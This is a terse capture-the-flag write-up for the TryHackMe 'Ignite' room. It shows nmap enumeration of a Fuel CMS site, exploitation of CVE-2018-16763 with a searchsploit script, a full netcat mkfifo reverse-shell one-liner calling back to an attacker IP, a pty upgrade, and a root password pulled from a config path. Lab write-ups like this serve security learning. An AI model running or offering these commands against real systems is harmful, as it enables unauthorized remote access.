# [Challenge](https://tryhackme.com/room/ignite)

- # ENUM
	- ### nmap (`nmap -A -p- -T4 ignite`)
		- PORT   STATE SERVICE VERSION
			80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
			| http-robots.txt: 1 disallowed entry 
			|_/fuel/
			|_http-title: Welcome to FUEL CMS
			|_http-server-header: Apache/2.4.18 (Ubuntu)

- # EXPLOITATION
	- Fuel CMS 1.4 ---- (`CVE-2018-16763`) ---> Remote Code Execution (Thanks `searchsploit`)
		- `python3 50477.py -u http://ignite`
			- Let's spawn a revshell (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.212 8888 >/tmp/f`)
			- `python -c "import pty; pty.spawn('/bin/bash')"`

- # PRIVILEGE ESCALATION
	- After a very long research, I found the password in `/var/www/html/fuel/application/config`: `mememe`
		- We're ROOT!